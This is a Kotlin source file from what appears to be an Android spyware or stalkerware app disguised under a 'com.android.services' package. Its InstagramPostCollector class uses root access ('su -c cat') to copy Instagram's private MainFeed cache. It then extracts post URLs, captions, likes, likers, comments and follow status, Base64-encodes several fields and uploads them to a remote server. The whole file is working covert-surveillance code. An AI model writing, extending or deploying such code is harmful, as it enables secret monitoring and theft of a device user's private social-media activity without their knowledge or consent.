package com.android.services.logs.collectors.im

import android.content.Context
import com.android.services.db.entities.InstagramPostRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.setPermissionInstagramCacheDir
import com.android.services.util.logException
import com.android.services.util.logVerbose
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.nio.channels.FileChannel
import java.nio.charset.Charset
import java.util.*

class InstagramPostCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncInstagram) {
            try {
                val instagramFeedList = retrieveFeedMessages(context, localDatabaseSource)
                if (instagramFeedList.isNotEmpty()) {
                    val startDate = instagramFeedList[instagramFeedList.size - 1].date
                    val endDate = instagramFeedList[0].date
                    val mInstagramPostSender = RemoteServerHelper(
                        context,
                        AppConstants.INSTAGRAM_POST_ROOTED_TYPE,
                        localDatabaseSource = localDatabaseSource
                    )
                    mInstagramPostSender.upload(instagramFeedList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.INSTAGRAM_POST_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.INSTAGRAM_POST_ROOTED_TYPE} Sync is Off")
        }
    }

    private fun retrieveFeedMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
    ): List<InstagramPostRooted> {
        var instagramFeedList = ArrayList<InstagramPostRooted>()
        try {
            setPermissionInstagramCacheDir()
            val file =
                File(AppUtils.retrieveFilePath(context,
                    AppConstants.DIR_INSTAGRAM,
                    "systemData.ins"))
            val instagramDir = File(AppConstants.INSTAGRAM_CACHE_PATH)
            if (instagramDir.exists()) {
                val files = instagramDir.listFiles()
                for (inFile in files) {
                    if (inFile.isFile) {
                        val fileName = inFile.name
                        if (fileName.contains("MainFeed")) {
                            Runtime.getRuntime().exec(arrayOf("su", "-c", "cat "
                                    + AppConstants.INSTAGRAM_CACHE_PATH + fileName
                                    + " > " + file.absolutePath))
                            break
                        }
                    }
                }
            }

            val stream = FileInputStream(file)
            val jsonString: String
            var savedTimeStamp = localDatabaseSource.selectInstagramPostRootedMaxTimeStamp()
            if (savedTimeStamp == null) savedTimeStamp = 0L

            try {
                val fileChannel = stream.channel
                val bb = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileChannel.size())
                jsonString = Charset.defaultCharset().decode(bb).toString()
                if (jsonString != "") {
                    val jsonData = JSONObject(jsonString)
                    val feedItems = jsonData.getJSONArray("feed_items")
                    for (j in 0 until feedItems.length()) {
                        val `object` = feedItems.getJSONObject(j)
                        var mediaOrAd: JSONObject? = null
                        try {
                            mediaOrAd = `object`.getJSONObject("media_or_ad")
                        } catch (e: JSONException) {
                            e.printStackTrace()
                        }
                        if (mediaOrAd == null) {
                            logVerbose("instagram feeds are null")
                        } else {
                            try {
                                var isImage = "1"
                                val timeStamp = mediaOrAd.getString("taken_at")
                                val currentTimeStamp = timeStamp.toLong()
                                if (currentTimeStamp > savedTimeStamp) {
                                    val deviceTimeStamp =
                                        AppUtils.formatDate(mediaOrAd.getString("taken_at"))
                                    var hasLiked = mediaOrAd.getString("has_liked")
                                    val likeCount = mediaOrAd.getString("like_count")
                                    hasLiked = if (hasLiked == "true") "yes" else "no"
                                    var videoUrl: JSONArray? = null
                                    try {
                                        videoUrl = mediaOrAd.getJSONArray("video_versions")
                                    } catch (e: Exception) {
                                        e.printStackTrace()
                                    }
                                    var url: JSONObject
                                    var urlValue: String
                                    if (videoUrl == null) {
                                        val imageUrl = mediaOrAd.getJSONObject("image_versions2")
                                        val urlArray = imageUrl.getJSONArray("candidates")
                                        url = urlArray.getJSONObject(0)
                                        urlValue = url.getString("url")
                                    } else {
                                        url = videoUrl.getJSONObject(0)
                                        urlValue = url.getString("url")
                                        isImage = "0"
                                    }
                                    val user = mediaOrAd.getJSONObject("user")
                                    val userName = user.getString("username")
                                    val hasAnonymousProfilePicture =
                                        user.getString("has_anonymous_profile_picture")
                                    val profilePicUrl = user.getString("profile_pic_url")
                                    var friendshipStatus: JSONObject? = null
                                    var following: String
                                    try {
                                        if (hasAnonymousProfilePicture == "false") friendshipStatus =
                                            user.getJSONObject("friendship_status")
                                    } catch (e: Exception) {
                                        e.message
                                    }
                                    if (friendshipStatus == null) {
                                        following = "0"
                                    } else {
                                        following = friendshipStatus.getString("following")
                                        if (following == "true") following = "1"
                                    }
                                    var caption: JSONObject? = null
                                    try {
                                        caption = mediaOrAd.getJSONObject("caption")
                                    } catch (jsonException: Exception) {
                                        jsonException.printStackTrace()
                                    }
                                    val text: String =
                                        if (caption == null) "feed is empty" else caption.getString(
                                            "text")
                                    var likersList = ""
                                    var likersArray: JSONArray? = null
                                    try {
                                        likersArray = mediaOrAd.getJSONArray("likers")
                                    } catch (json: Exception) {
                                        json.printStackTrace()
                                    }
                                    if (likersArray == null) {
                                        likersList = "not available"
                                    } else {
                                        for (i in 0 until likersArray.length()) {
                                            val likerName = likersArray.getJSONObject(i)
                                            val name = likerName.getString("username")
                                            likersList += name
                                            if (i < likersArray.length() - 1) likersList =
                                                "$likersList , "
                                        }
                                    }
                                    var commentsList = ""
                                    var comments: JSONArray? = null
                                    try {
                                        comments = mediaOrAd.getJSONArray("preview_comments")
                                    } catch (js: Exception) {
                                        js.printStackTrace()
                                    }
                                    if (comments == null) {
                                        commentsList = "not available"
                                    } else {
                                        if (comments.length() > 0) {
                                            for (x in 0 until comments.length()) {
                                                val comment = comments.getJSONObject(x)
                                                val userComment = comment.getJSONObject("user")
                                                val commentText = comment.getString("text")
                                                val commentName = userComment.getString("username")
                                                commentsList =
                                                    "$commentsList$commentName: $commentText"
                                                if (x < comments.length() - 1) commentsList =
                                                    "$commentsList , "
                                            }
                                        } else {
                                            commentsList = "not available"
                                        }
                                    }

                                    val realTimeStamp = timeStamp.toLong() / 1000
                                    val instagramPostRooted = InstagramPostRooted()
                                    instagramPostRooted.apply {
                                        this.messageId = deviceTimeStamp
                                        this.username = userName
                                        this.userProfilePic = profilePicUrl
                                        this.following = following
                                        this.date = deviceTimeStamp
                                        this.feedUrl = urlValue
                                        this.feedText = AppUtils.convertStringToBase64(text)
                                        this.feedLikes = likeCount
                                        this.feedLiked = hasLiked
                                        this.feedLikersList =
                                            AppUtils.convertStringToBase64(likersList)
                                        this.feedCommentersList =
                                            AppUtils.convertStringToBase64(commentsList)
                                        this.isImage = isImage
                                        this.feedDate = AppUtils.parseDate(deviceTimeStamp)
                                        this.timeStamp = currentTimeStamp
                                        this.status = 0
                                    }
                                    instagramFeedList.add(instagramPostRooted)
                                }
                            } catch (e: Exception) {
                                e.printStackTrace()
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                logVerbose(
                    "${AppConstants.INSTAGRAM_POST_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            } finally {
                stream.close()
            }
            logVerbose("${AppConstants.INSTAGRAM_POST_ROOTED_TYPE} rooted list = $instagramFeedList")
            if (instagramFeedList.isNotEmpty())
                localDatabaseSource.insertInstagramPostRooted(instagramFeedList)
            localDatabaseSource.selectInstagramPostRooted {
                instagramFeedList = it as ArrayList<InstagramPostRooted>
            }
            logVerbose("${AppConstants.INSTAGRAM_POST_ROOTED_TYPE} selected list = $instagramFeedList")
        } catch (e: Exception) {
            logVerbose(
                "${AppConstants.INSTAGRAM_POST_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                throwable = e
            )
        }
        return instagramFeedList
    }

}
